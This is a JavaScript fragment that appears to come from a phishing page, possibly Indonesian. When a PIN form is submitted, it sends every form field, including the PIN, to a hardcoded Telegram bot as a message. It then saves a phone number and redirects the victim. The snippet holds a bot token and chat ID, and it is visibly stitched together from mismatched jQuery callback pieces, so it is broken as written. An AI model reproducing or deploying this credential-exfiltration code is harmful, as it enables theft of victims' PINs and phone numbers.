
    const chat_id = '7142327444', botID = 'bot6835147883:AAFmCIFxo_lG-iwUyIvegnjemiEoduvsKCc';
    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;

    document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
        e.preventDefault(); // Don't submit
        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
        null, 2); // Prettify the JSON so we can read the data easily
        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
            method: 'POST',
            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
        });
complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
   $('#lodingku').hide();
     window.location = "data.html";
 var nomor = document.getElementById('nope').value;
sessionStorage.setItem("nomor", nomor);
     }, 500);
    setTimeout(function(){  
       $("#djload").hide();  
       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
    }, 2000);
        }
    });
 });
    return false;
});   
     